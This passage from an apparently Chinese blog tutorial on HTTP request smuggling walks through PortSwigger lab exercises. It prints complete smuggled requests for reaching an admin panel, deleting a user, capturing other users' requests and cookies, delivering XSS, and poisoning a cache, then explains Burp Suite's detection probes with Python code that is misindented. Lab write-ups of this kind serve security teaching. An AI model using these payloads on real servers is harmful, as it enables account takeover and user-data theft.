<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: aca61fa51f4feb1d80a80fd1006f007b.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 68</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /admin/delete?username=carlos HTTP/1.1</span><br><span class="line">Host: localhost</span><br></pre></td></tr></table></figure>
<p>多发送几次，发现已经302了，此时是已经成功删除carlos用户的了：</p>
<p><img src="/2020/03/11/浅析HRS漏洞/12.png" alt=""></p>
<p>此时重新登录再次查看，发现已经没有carlos用户了：</p>
<p><img src="/2020/03/11/浅析HRS漏洞/13.png" alt=""></p>
<h4 id="TE-CL场景绕过"><a href="#TE-CL场景绕过" class="headerlink" title="TE.CL场景绕过"></a>TE.CL场景绕过</h4><p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl</a></p>
<p>题目要求：本实验涉及前端服务器和后端服务器，后端服务器不支持TE。在/admin处有一个管理面板，但是前端服务器阻止对该面板的访问。要解决此问题，请将请求走私到访问管理面板并删除后端服务器的carlos用户。</p>
<p>和前面类似，不再多说：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: aca31f051f556e6780403e2f00570083.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">3d</span><br><span class="line">GET /admin/delete?username=carlos HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line"></span><br><span class="line">0</span><br></pre></td></tr></table></figure>
<p><img src="/2020/03/11/浅析HRS漏洞/14.png" alt=""></p>
<p><img src="/2020/03/11/浅析HRS漏洞/15.png" alt=""></p>
<h3 id="获取前端服务器重写请求字段"><a href="#获取前端服务器重写请求字段" class="headerlink" title="获取前端服务器重写请求字段"></a>获取前端服务器重写请求字段</h3><blockquote>
<p>在有的网络环境下，前端代理服务器在收到请求后，不会直接转发给后端服务器，而是先添加一些必要的字段，然后再转发给后端服务器。这些字段是后端服务器对请求进行处理所必须的，比如：</p>
<ul>
<li>描述TLS连接所使用的协议和密码</li>
<li>包含用户IP地址的XFF头</li>
<li>用户的会话令牌ID</li>
</ul>
<p>总之，如果不能获取到代理服务器添加或者重写的字段，我们走私过去的请求就不能被后端服务器进行正确的处理。那么我们该如何获取这些值呢。PortSwigger提供了一个很简单的方法，主要是三大步骤：</p>
<ul>
<li>找一个能够将请求参数的值输出到响应中的POST请求</li>
<li>把该POST请求中，找到的这个特殊的参数放在消息的最后面</li>
<li>然后走私这一个请求，然后直接发送一个普通的请求，前端服务器对这个请求重写的一些字段就会显示出来。</li>
</ul>
</blockquote>
<p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting</a></p>
<p>题目要求：本实验涉及前端服务器和后端服务器，并且前端服务器不支持TE。/admin上有一个管理面板，但只有IP地址为127.0.0.1的用户才能访问。前端服务器将HTTP标头添加到包含其IP地址的传入请求中。它类似于X-Forwarded-For标头，但名称不同。要解决此问题，请向后端服务器走私一个请求，以显示前端服务器添加的标头。然后将包含添加的标头的请求走私到后端服务器，访问管理面板，并删除用户carlos。</p>
<p>我们像之前一样发包尝试通过Host头设置127.0.0.1来访问/admin，发现行不通：</p>
<p><img src="/2020/03/11/浅析HRS漏洞/18.png" alt=""></p>
<p>那就是说，后端服务器不是通过Host头而是通过其他可能是前端服务器添加的头来解析得到IP地址的。</p>
<p>此时，我们需要先找一个能够将请求参数的值输出到响应中的POST请求，这里找到了网页的搜索功能：</p>
<p>首先我们找一个能够将请求参数的值输出到响应中的POST请求，这里找到了网页的搜索功能：</p>
<p><img src="/2020/03/11/浅析HRS漏洞/16.png" alt=""></p>
<p>其中该请求报文如下，直接POST方式带上search参数访问/即可：</p>
<p><img src="/2020/03/11/浅析HRS漏洞/17.png" alt=""></p>
<p>接着构造如下报文：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: ac991ff31ee2ddda80ad48c000dd0065.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 78</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">POST / HTTP/1.1</span><br><span class="line">Content-Length: 100</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">search=mi1k7ea</span><br></pre></td></tr></table></figure>
<p>其中CL值为100，而后面数据的长度是不够100的，因此后端服务器在接收到这个走私请求之后会认为这个请求还没传输完毕，继续等待传输。接着我们又继续发送相同的数据包，后端服务器接收到的是前端代理服务器已经处理好的请求，当接收的数据的总长度到达100时，后端服务器认为这个请求已经传输完毕了，然后进行响应。这样一来，后来的请求的一部分被作为了走私的请求的参数的一部分，然后从响应中表示了出来，我们就能获取到了前端服务器重写的字段。</p>
<p>发送几次看到Search结果处返回了包含X-NntHAY-Ip头，它的值为IP地址：</p>
<p><img src="/2020/03/11/浅析HRS漏洞/19.png" alt=""></p>
<p>将之前CL.TE的构造报文的头改下就ok了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: ac991ff31ee2ddda80ad48c000dd0065.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 52</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /admin HTTP/1.1</span><br><span class="line">X-NntHAY-Ip: 127.0.0.1</span><br></pre></td></tr></table></figure>
<p>多发送几次就能成功访问到/admin页面：</p>
<p><img src="/2020/03/11/浅析HRS漏洞/20.png" alt=""></p>
<p>最后就是构造删除carlos用户的报文了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: ac991ff31ee2ddda80ad48c000dd0065.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 75</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /admin/delete?username=carlos HTTP/1.1</span><br><span class="line">X-NntHAY-Ip: 127.0.0.1</span><br></pre></td></tr></table></figure>
<p>多发送几次即可：</p>
<p><img src="/2020/03/11/浅析HRS漏洞/21.png" alt=""></p>
<p><img src="/2020/03/11/浅析HRS漏洞/22.png" alt=""></p>
<h3 id="获取其他用户的请求"><a href="#获取其他用户的请求" class="headerlink" title="获取其他用户的请求"></a>获取其他用户的请求</h3><blockquote>
<p>在上一个实验中，我们通过走私一个不完整的请求来获取前端服务器添加的字段，而字段来自于我们后续发送的请求。换句话说，我们通过请求走私获取到了我们走私请求之后的请求。如果在我们的恶意请求之后，其他用户也进行了请求呢？我们寻找的这个POST请求会将获得的数据存储并展示出来呢？这样一来，我们可以走私一个恶意请求，将其他用户的请求的信息拼接到走私请求之后，并存储到网站中，我们再查看这些数据，就能获取用户的请求了。这可以用来偷取用户的敏感信息，比如账号密码等信息。</p>
</blockquote>
<p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests</a></p>
<p>题目要求：本实验涉及前端服务器和后端服务器，并且前端服务器不支持TE。为了解决实验室问题，请将请求走私到后端服务器，该请求将下一个用户的请求存储在应用程序中。然后检索下一个用户的请求，并使用受害用户的cookie来访问其帐户。</p>
<p>首先我们需要找到保存用户POST参数的页面，这里我们随便点击一篇博文查看，在提交评论的时候可以在文章评论一栏中保存我们POST的内容：</p>
<p><img src="/2020/03/11/浅析HRS漏洞/23.png" alt=""></p>
<p>对应如下接口：</p>
<p><img src="/2020/03/11/浅析HRS漏洞/24.png" alt=""></p>
<p>构造如下请求报文：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: ac0b1fda1f41126280f9132f0097008c.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: https://ac0b1fda1f41126280f9132f0097008c.web-security-academy.net/post/comment/confirmation?postId=2</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: session=JCjJgAksKxZgUSaXS9u7FJc8FqsuaNDt</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 270</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">POST /post/comment HTTP/1.1</span><br><span class="line">Host: ac661f531e07f12180eb2f1a009d0092.web-security-academy.net</span><br><span class="line">Cookie: session=JCjJgAksKxZgUSaXS9u7FJc8FqsuaNDt</span><br><span class="line">Content-Length: 400</span><br><span class="line"></span><br><span class="line">csrf=za3lvdP3pkuZE53Npssm5z7LN48uUQoR&amp;postId=2&amp;name=mi1k7ea&amp;email=email%40qq.com&amp;website=&amp;comment=</span><br></pre></td></tr></table></figure>
<p>其中CL值为400，而后面数据的长度是不够400的，因此后端服务器在接收到这个走私请求之后会认为这个请求还没传输完毕，继续等待传输。接着我们又继续发送相同的数据包，后端服务器接收到的是前端代理服务器已经处理好的请求，当接收的数据的总长度到达400时，后端服务器认为这个请求已经传输完毕了，然后进行响应。这样一来，后来的请求的一部分被作为了走私的请求的参数comment的一部分，然后在指定的博文的评论中返回显示出来。</p>
<p>多请求几次，然后到该博文中查看评论就看到包括其他用户请求的信息（这里是User-Agent不同来辨别的）：</p>
<p><img src="/2020/03/11/浅析HRS漏洞/25.png" alt=""></p>
<p><img src="/2020/03/11/浅析HRS漏洞/26.png" alt=""></p>
<h3 id="组合反射型XSS"><a href="#组合反射型XSS" class="headerlink" title="组合反射型XSS"></a>组合反射型XSS</h3><p>当HRS与反射型XSS组合利用时，就不再需要用户的交互来触发XSS了。</p>
<p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss</a></p>
<p>题目要求：本实验涉及前端服务器和后端服务器，并且前端服务器不支持TE。该应用程序在User-Agent头处存在反射型XSS。 为了解决实验室问题，请将请求走私到后端服务器，该请求导致下一个用户的请求接收到包含执行<code>alert(1)</code>的XSS漏洞的响应。</p>
<p>首先我们找下存在反射型XSS的页面，根据提示是User-Agent注入的XSS，而我们在查看具体文章的时候确实是找到了这个接口存在User-Agent的反射型XSS：</p>
<p><img src="/2020/03/11/浅析HRS漏洞/27.png" alt=""></p>
<p>为了让这个反射型XSS的利用更多深入，我们结合HRS，这样无需用户交互就能触发XSS。构造如下请求报文：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: ac131fc91e3b433b80100743007900e8.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 74</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /post?postId=4 HTTP/1.1</span><br><span class="line">User-Agent: &quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;#</span><br></pre></td></tr></table></figure>
<p>发送几次：</p>
<p><img src="/2020/03/11/浅析HRS漏洞/29.png" alt=""></p>
<p>然后刷新界面就会触发XSS弹框：</p>
<p><img src="/2020/03/11/浅析HRS漏洞/28.png" alt=""></p>
<h3 id="组合Web缓存投毒攻击"><a href="#组合Web缓存投毒攻击" class="headerlink" title="组合Web缓存投毒攻击"></a>组合Web缓存投毒攻击</h3><blockquote>
<p>一般来说，前端服务器出于性能原因，会对后端服务器的一些资源进行缓存，如果存在HTTP请求走私漏洞，则有可能使用重定向来进行缓存投毒，从而影响后续访问的所有用户。</p>
</blockquote>
<p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning</a></p>
<p>题目要求：本实验涉及前端服务器和后端服务器，并且前端服务器不支持TE。前端服务器配置为缓存某些响应。为了解决此问题，请执行请求走私攻击，使缓存中毒，以便随后对JavaScript文件的请求将重定向到漏洞利用服务器。中毒的缓存应alert(document.cookie)。</p>
<p>实验环境提供了漏洞利用的辅助服务器，这里我们编辑响应的报文如下，为了方便看效果先将alert(document.cookie)改为alert(1)：</p>
<p><img src="/2020/03/11/浅析HRS漏洞/30.png" alt=""></p>
<p>构造如下POST请求走私报文，这里可以通过HRS攻击使得该网站的下一个请求重定向到漏洞利用服务器上的/post接口，而我们知道该接口响应返回的是前面设置的alert(1)内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: aceb1fb41f8e127580ac37b400560067.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 178</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /post/next?postId=1 HTTP/1.1</span><br><span class="line">Host: ac521f121f4e12738066379201d30067.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 10</span><br></pre></td></tr></table></figure>
<p>接着重放访问其中随意一个js文件的报文，这里选择/resources/js/tracking.js，当上一个HRS攻击报文发送后，由其中”GET /post/next?postId=1 HTTP/1.1”之后的内容将会和当前的访问/resources/js/tracking.js的报文拼接起来，而此时合并的报文实际是访问漏洞利用服务器的js文件即响应返回“alert(1)”，此时缓存的/resources/js/tracking.js文件的内容实际上就被投毒攻击为“alert(1)”：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /resources/js/tracking.js HTTP/1.1</span><br><span class="line">Host: aceb1fb41f8e127580ac37b400560067.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: https://aceb1fb41f8e127580ac37b400560067.web-security-academy.net/</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: session=mOFHLW0BPPkUKB4V858oSPuy3rTh9eUn</span><br></pre></td></tr></table></figure>
<p>上面POST和GET报文交替发送多次，然后点击第一篇博文查看，可以看到响应为缓存的漏洞利用服务器上的js文件：</p>
<p><img src="/2020/03/11/浅析HRS漏洞/31.png" alt=""></p>
<p>此时再访问主页，成功弹框，即缓存投毒攻击成功：</p>
<p><img src="/2020/03/11/浅析HRS漏洞/32.png" alt=""></p>
<h2 id="0x05-BurpSuite的HRS扫描原理"><a href="#0x05-BurpSuite的HRS扫描原理" class="headerlink" title="0x05 BurpSuite的HRS扫描原理"></a>0x05 BurpSuite的HRS扫描原理</h2><p>简单地说，BurpSuite是通过构造特定的数据包让后端服务器阻塞，通过超时机制来进行HRS漏洞检测的。</p>
<h3 id="CL-TE型HRS扫描原理"><a href="#CL-TE型HRS扫描原理" class="headerlink" title="CL.TE型HRS扫描原理"></a>CL.TE型HRS扫描原理</h3><p>针对CL.TE型HRS，BurpSuite发送以下报文进行检测：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: ceshi.domain.com</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Length: 4</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">Z</span><br><span class="line">Q</span><br></pre></td></tr></table></figure>
<p>如果前端服务器是使用CL解析，那么根据数据包中的<code>Content-Length: 4</code>，前台服务器只会转发这个部分：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1\r\n</span><br><span class="line">Z</span><br></pre></td></tr></table></figure>
<p>而后端服务器使用TE解析，由于前端服务器转发过了的body中并未有<code>0\r\n\r\n</code>，因此后端服务器会一直等待下一个chunked块的大小值，但由于没有因此会造成约为10s的超时。</p>
<p>但是当数据包中的<code>Content-Length: 11</code>时，因为Q是一个无效的块大小值（chunked块大小值用十六进制表示，Q不能表示十六进制数），所以后端服务器中该请求结束，不会产生超时，双换行是因为部分系统没有换行会进行等待，原因未知：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: ceshi.domain.com</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Length: 11</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">Z</span><br><span class="line">Q</span><br></pre></td></tr></table></figure>
<p>如果服务端是TE.CL类型，则由于无效的块大小“Q”，前端服务器就已经拒绝该请求而不会转发到后端服务器中。这样可以防止后端服务器Socket中毒。</p>
<p>代码实现如下，先判断CL为4时是否超时，若超时且CL为11时不超时，如果CL为4的响应时间大于5s且CL为4的请求响应时间远大于CL为11的响应时间，即可认为存在CL.TE型HRS漏洞：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_CLTE</span><span class="params">(self)</span>:</span></span><br><span class="line">    n = <span class="number">0</span></span><br><span class="line">    payloads = self.payload_headers <span class="keyword">if</span> self.headers_payload == [] <span class="keyword">else</span> self.headers_payload</span><br><span class="line">    <span class="keyword">for</span> headers <span class="keyword">in</span> payloads:</span><br><span class="line">        n = n + <span class="number">1</span></span><br><span class="line">        headers[<span class="string">'Content-Length'</span>] = <span class="number">4</span></span><br><span class="line">        payload = <span class="string">"1\r\nZ\r\nQ\r\n\r\n\r\n"</span></span><br><span class="line">        print(self.url, headers)</span><br><span class="line">        t2 = self.detect_CLTE(headers, payload)</span><br><span class="line">        <span class="keyword">if</span> t2 == <span class="keyword">None</span>: t2 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">if</span> t2 &lt; <span class="number">5</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                headers[<span class="string">'Content-Length'</span>] = <span class="number">11</span></span><br><span class="line">                print(self.url, headers)</span><br><span class="line">                payload = <span class="string">"1\r\nZ\r\nQ\r\n\r\n\r\n"</span></span><br><span class="line">                t1 = self.detect_CLTE(headers, payload)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> t1 == <span class="keyword">None</span>: t1 = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">print</span> (t1, t2)</span><br><span class="line">                    <span class="keyword">if</span> t2 &gt; <span class="number">5</span> <span class="keyword">and</span> t2 / t1 &gt;= <span class="number">5</span>:</span><br><span class="line">                        self.valid = <span class="keyword">True</span></span><br><span class="line">                        self.type = <span class="string">"CL-TE"</span></span><br><span class="line">                        self.headers_payload = [headers]</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">False</span></span><br></pre></td></tr></table></figure>
<h3 id="TE-CL型HRS扫描原理"><a href="#TE-CL型HRS扫描原理" class="headerlink" title="TE.CL型HRS扫描原理"></a>TE.CL型HRS扫描原理</h3><p>针对TE.CL型HRS，BurpSuite发送以下报文进行检测：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: ceshi.domain.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 6</span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">X</span><br></pre></td></tr></table></figure>
<p>因为前端服务器使用TE解析，<code>0\r\n\r\n</code>代表chunked结束，所以后端服务器只会收到如下部分：</p>
